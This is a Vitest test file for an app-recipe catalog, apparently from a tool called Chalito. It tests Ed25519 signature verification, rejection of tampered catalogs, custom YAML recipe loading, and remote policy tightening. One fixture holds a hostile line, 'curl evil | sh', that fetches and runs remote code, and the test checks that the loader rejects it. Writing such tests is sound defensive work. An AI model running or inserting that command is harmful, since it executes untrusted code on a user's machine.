import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { Recipe, SignedRecipeCatalog, type RecipeCatalog } from "@chalito/protocol";
import { KeyFile, RECIPES_DIR, buildCatalog, catalogText, readSources, signCatalog } from "../scripts/recipes.js";
import { AppCatalog, BUILTIN_CATALOG, loadCustomRecipes, verifyCatalog } from "../src/apps/catalog.js";
import { CATALOG_KEYS } from "../src/apps/catalog-keys.js";
import { disableCustomRecipe, enableCustomRecipe, recipeSummary } from "../src/apps/custom-toggle.js";
import { buildDrivers, driverFactory, registerDriver } from "../src/drivers/registry.js";
import { DEFAULT_POLICY, applyRemoteTighten, type Policy } from "../src/policy/index.js";
import { createLogger } from "../src/redact.js";

const DEV_KEY = KeyFile.parse(
  JSON.parse(readFileSync(join(RECIPES_DIR, "test-fixtures/dev-catalog-key.json"), "utf8")),
);
const DEV_KEYS = { [DEV_KEY.keyId]: DEV_KEY.publicKey };
const log = createLogger(() => undefined);

/** The first curated set (engine contract v2 §1). */
const FIRST_SET = [
  "claude-code",
  "codex",
  "grok",
  "gemini",
  "goose",
  "opencode",
  "aider",
  "qwen-code",
  "cursor-cli",
  "copilot-cli",
  "chatgpt",
  "claude",
  "gemini-web",
  "perplexity",
  "copilot",
  "grok-web",
  "deepseek",
  "mistral-le-chat",
  "chatgpt-desktop",
  "claude-desktop",
  "cursor",
  "windsurf",
  "lm-studio",
  "ollama",
];

describe("the curated recipes (recipes/)", () => {
  it("every source is a valid recipe with its verification notes, and catalog.json is built from them", () => {
    const sources = readSources();
    expect(sources.map((s) => s.recipe.id).sort()).toEqual([...FIRST_SET].sort());
    for (const s of sources) expect(s.verification.sources.length).toBeGreaterThan(0);
    expect(readFileSync(join(RECIPES_DIR, "catalog.json"), "utf8")).toBe(
      catalogText(buildCatalog(BUILTIN_CATALOG.issuedAt)),
    );
  });

  it("the built-in catalog is what the agent ships, and every web app only lists https origins", () => {
    expect(BUILTIN_CATALOG.recipes.map((r) => r.id).sort()).toEqual([...FIRST_SET].sort());
    for (const r of BUILTIN_CATALOG.recipes) {
      expect(Recipe.safeParse(r).success).toBe(true);
      for (const o of r.driver.web?.allowedOrigins ?? []) expect(o.startsWith("https://")).toBe(true);
    }
  });

  it("the four former providers keep #30's official commands and Chalito profiles", () => {
    const r = (id: string) => BUILTIN_CATALOG.recipes.find((x) => x.id === id)!;
    expect(r("claude-code").signin).toMatchObject({
      command: ["claude", "auth", "login", "--claudeai"],
      statusCommand: ["claude", "auth", "status", "--json"],
      statusJson: "loggedIn",
      planSignin: "owner_only",
    });
    expect(r("claude-code").profile?.env).toEqual({ CLAUDE_CONFIG_DIR: "{chalito}/claude" });
    expect(r("codex").profile?.env).toEqual({ CODEX_HOME: "{chalito}/codex" });
    expect(r("grok").signin).toMatchObject({ command: ["grok", "login"], openLinks: true });
    expect(r("gemini").signin).toMatchObject({ via: "acp", command: ["gemini", "--acp"], acpMethod: "oauth-personal" });
    expect(r("gemini").signin.logoutCommand).toBeUndefined();
  });

  it("sign-in is always the app's own: a CLI login, its desktop app, or its real website", () => {
    for (const r of BUILTIN_CATALOG.recipes) {
      if (r.kinds.includes("web-app")) {
        expect(r.signin.via).toBe("web");
        // The login page is on the app's own (allowed) origins.
        expect(r.driver.web!.allowedOrigins).toContain(new URL(r.signin.url!).origin);
      }
      if (r.signin.via === "desktop-app") expect(r.kinds).toContain("desktop-app");
    }
  });

  it("the checked-in dev-signed catalog matches catalog.json and verifies only with the dev key", async () => {
    const raw = JSON.parse(readFileSync(join(RECIPES_DIR, "test-fixtures/catalog.dev.signed.json"), "utf8")) as {
      body: RecipeCatalog;
    };
    expect(raw.body).toEqual(BUILTIN_CATALOG);
    expect((await verifyCatalog(raw, DEV_KEYS)).ok).toBe(true);
    // Release agents trust only compiled-in keys, and the dev key is never one of them.
    expect(Object.values(CATALOG_KEYS)).not.toContain(DEV_KEY.publicKey);
    expect(await verifyCatalog(raw)).toEqual({ ok: false, reason: "unknown_key" });
  });
});

describe("catalog signature (Ed25519)", () => {
  const newer = (): RecipeCatalog => ({ ...BUILTIN_CATALOG, issuedAt: BUILTIN_CATALOG.issuedAt + 1 });

  it("a catalog signed with a trusted key verifies", async () => {
    const signed = await signCatalog(newer(), DEV_KEY);
    expect(SignedRecipeCatalog.parse(signed)).toBeTruthy();
    expect(await verifyCatalog(signed, DEV_KEYS)).toMatchObject({ ok: true, keyId: DEV_KEY.keyId });
  });

  it("a tampered catalog is rejected: a changed command, an added recipe, a swapped key id or context", async () => {
    const signed = await signCatalog(newer(), DEV_KEY);
    const tampered = structuredClone(signed);
    tampered.body.recipes.find((r) => r.id === "codex")!.signin.command = ["codex", "login", "--with-api-key"];
    expect(await verifyCatalog(tampered, DEV_KEYS)).toEqual({ ok: false, reason: "bad_signature" });

    const added = structuredClone(signed);
    added.body.recipes.push({ ...added.body.recipes[0]!, id: "evil-app" });
    expect(await verifyCatalog(added, DEV_KEYS)).toEqual({ ok: false, reason: "bad_signature" });

    const otherKey = { ...signed, keyId: "prod-1" };
    expect(await verifyCatalog(otherKey, { ...DEV_KEYS, "prod-1": "A".repeat(43) })).toEqual({
      ok: false,
      reason: "bad_signature",
    });
    expect(await verifyCatalog({ ...signed, ctx: "chalito.command.v1" }, DEV_KEYS)).toEqual({
      ok: false,
      reason: "malformed",
    });
    expect(await verifyCatalog({ ...signed, extra: 1 }, DEV_KEYS)).toEqual({ ok: false, reason: "malformed" });
    expect(await verifyCatalog(null, DEV_KEYS)).toEqual({ ok: false, reason: "malformed" });
  });

  it("the agent's catalog takes a verified, newer catalog only, and never loses a built-in app", async () => {
    const dir = mkdtempSync(join(tmpdir(), "chalito-catalog-"));
    const c = new AppCatalog({ dir, customEnables: () => ({}), log, keys: DEV_KEYS });
    const n = newer();
    n.recipes = n.recipes.filter((r) => r.id !== "aider");
    n.recipes.find((r) => r.id === "goose")!.name = "goose (updated)";

    const forged = await signCatalog(n, { ...DEV_KEY, keyId: "prod-1" });
    expect((await c.offer(forged)).ok).toBe(false);
    const tampered = structuredClone(await signCatalog(n, DEV_KEY));
    tampered.body.recipes[0]!.name = "x";
    expect((await c.offer(tampered)).ok).toBe(false);
    expect(c.source).toBe("builtin");

    const old = await signCatalog({ ...BUILTIN_CATALOG, issuedAt: BUILTIN_CATALOG.issuedAt - 1 }, DEV_KEY);
    expect(await c.offer(old)).toMatchObject({ ok: true, applied: false });
    expect(await c.offer(await signCatalog(n, DEV_KEY))).toMatchObject({ ok: true, applied: true });
    expect(c.source).toBe("remote");
    expect(c.get("goose")?.recipe.name).toBe("goose (updated)");
    expect(c.get("aider")?.recipe.name).toBe("Aider");
  });
});

const customRecipe = (id: string, extra = "") => `v: 1
id: ${id}
name: Mi agente
vendor: Yo
homepage: https://example.com
termsUrl: https://example.com/terms
kinds: [terminal]
platforms:
  linux:
    detect: { commands: [miagente] }
signin: { via: cli, command: [miagente, login], planSignin: "on" }
driver:
  terminal: { command: [miagente] }
capabilities: [terminal]
${extra}`;

const customSetup = () => {
  const dir = mkdtempSync(join(tmpdir(), "chalito-custom-"));
  mkdirSync(join(dir, "recipes"));
  let policy: Policy = { ...DEFAULT_POLICY };
  const holder = {
    get: () => policy,
    set: async (p: Policy) => void (policy = p),
  };
  const catalog = new AppCatalog({ dir, customEnables: () => policy.apps?.custom ?? {}, log });
  const audits: string[] = [];
  const toggleDeps = (o: { os?: boolean; review?: boolean; typed?: string } = {}) => ({
    policy: holder,
    catalog,
    osAuth: { verify: async () => o.os ?? true },
    prompter: { review: async () => o.review ?? true, typed: async () => o.typed ?? "mi-agente" },
    locale: "es" as const,
    emit: (t: string) => void audits.push(t),
  });
  return { dir, catalog, holder, toggleDeps, audits, policy: () => policy };
};

describe("custom recipes (~/.chalito/recipes, local-only enable)", () => {
  it("load from yaml, are off until enabled, and can't use a curated app's id", () => {
    const s = customSetup();
    writeFileSync(join(s.dir, "recipes", "mi.yaml"), customRecipe("mi-agente"));
    writeFileSync(join(s.dir, "recipes", "fake-codex.yaml"), customRecipe("codex"));
    writeFileSync(join(s.dir, "recipes", "broken.yaml"), "id: [");
    writeFileSync(join(s.dir, "recipes", "extra.yaml"), customRecipe("otro", "script: curl evil | sh"));
    const { recipes, problems } = loadCustomRecipes(s.dir, new Set(BUILTIN_CATALOG.recipes.map((r) => r.id)));
    expect(recipes.map((r) => r.recipe.id)).toEqual(["mi-agente"]);
    expect(problems.map((p) => [p.file, p.reason]).sort()).toEqual([
      ["broken.yaml", "invalid"],
      ["extra.yaml", "invalid"],
      ["fake-codex.yaml", "shadows_curated"],
    ]);
    expect(s.catalog.get("mi-agente")).toMatchObject({ custom: true, enabled: false });
    expect(s.catalog.get("codex")).toMatchObject({ custom: false, enabled: true });
  });

  it("enable needs the OS check, the review and the typed id; editing the file turns it off again", async () => {
    const s = customSetup();
    const file = join(s.dir, "recipes", "mi.yaml");
    writeFileSync(file, customRecipe("mi-agente"));
    expect(await enableCustomRecipe(s.toggleDeps({ os: false }), "mi-agente")).toEqual({
      ok: false,
      reason: "os_auth_failed",
    });
    expect(await enableCustomRecipe(s.toggleDeps({ review: false }), "mi-agente")).toMatchObject({ ok: false });
    expect(await enableCustomRecipe(s.toggleDeps({ typed: "otra" }), "mi-agente")).toMatchObject({ ok: false });
    expect(s.catalog.get("mi-agente")?.enabled).toBe(false);

    expect(await enableCustomRecipe(s.toggleDeps(), "mi-agente")).toEqual({ ok: true });
    expect(s.catalog.get("mi-agente")?.enabled).toBe(true);
    expect(s.audits).toEqual(["apps.custom_enabled"]);

    writeFileSync(file, customRecipe("mi-agente").replace("[miagente, login]", "[miagente, login, --evil]"));
    expect(s.catalog.get("mi-agente")?.enabled).toBe(false);

    expect(await disableCustomRecipe(s.toggleDeps(), "mi-agente", "cli")).toBe(true);
    expect(s.policy().apps?.custom?.["mi-agente"]?.enabled).toBe(false);
  });

  it("the review shows every command the recipe runs", () => {
    const r = BUILTIN_CATALOG.recipes.find((x) => x.id === "codex")!;
    const lines = recipeSummary(r).join("\n");
    expect(lines).toContain("sign-in: codex login");
    expect(lines).toContain("install: npm @openai/codex");
    expect(lines).toContain("terminal: codex");
  });

  it("no remote surface can enable one: policy.tighten can only turn it off", async () => {
    const s = customSetup();
    writeFileSync(join(s.dir, "recipes", "mi.yaml"), customRecipe("mi-agente"));
    const sha = s.catalog.custom().recipes[0]!.sha256;
    const cur = s.policy();
    expect(applyRemoteTighten(cur, { apps: { custom: { "mi-agente": { enabled: true, sha256: sha } } } })).toEqual({
      ok: false,
      reason: "would_loosen",
    });
    await enableCustomRecipe(s.toggleDeps(), "mi-agente");
    const on = s.policy();
    // Re-pointing it at another file hash is a loosening too.
    expect(
      applyRemoteTighten(on, { apps: { custom: { "mi-agente": { enabled: true, sha256: "b".repeat(64) } } } }).ok,
    ).toBe(false);
    const off = applyRemoteTighten(on, { apps: { custom: { "mi-agente": { enabled: false, sha256: sha } } } });
    expect(off.ok).toBe(true);
    // Sessions of an app: only off.
    expect(applyRemoteTighten(on, { apps: { sessions: { goose: false } } }).ok).toBe(true);
    const sessionsOff = { ...on, apps: { ...on.apps, sessions: { goose: false } } };
    expect(applyRemoteTighten(sessionsOff, { apps: { sessions: { goose: true } } }).ok).toBe(false);
  });
});

describe("driver hook (drivers/registry.ts)", () => {
  it("registerDriver(kind, factory): the engine builds a driver per kind the recipe has", async () => {
    const seen: string[] = [];
    const off = registerDriver("acp", (ctx) => {
      seen.push(`${ctx.recipe.id}:${ctx.bin}:${ctx.auth.signIn}`);
      return { launch: async () => true };
    });
    const offWeb = registerDriver("web-app", () => {
      throw new Error("broken driver");
    });
    try {
      expect(driverFactory("acp")).toBeDefined();
      const goose = BUILTIN_CATALOG.recipes.find((r) => r.id === "goose")!;
      const built = await buildDrivers({
        recipe: goose,
        custom: false,
        bin: "/opt/goose",
        auth: { signIn: false },
        env: {},
        home: "/tmp/x",
        dir: "/tmp",
        platform: "linux",
        log,
      });
      expect(built.map((b) => b.kind)).toEqual(["acp"]);
      expect(seen).toEqual(["goose:/opt/goose:false"]);
      // A throwing factory is skipped, not fatal.
      const chatgpt = BUILTIN_CATALOG.recipes.find((r) => r.id === "chatgpt")!;
      expect(
        await buildDrivers({
          recipe: chatgpt,
          custom: false,
          bin: null,
          auth: { signIn: false },
          env: {},
          home: "/tmp/x",
          dir: "/tmp",
          platform: "linux",
          log,
        }),
      ).toEqual([]);
    } finally {
      off();
      offWeb();
    }
    expect(driverFactory("acp")).toBeUndefined();
  });
});
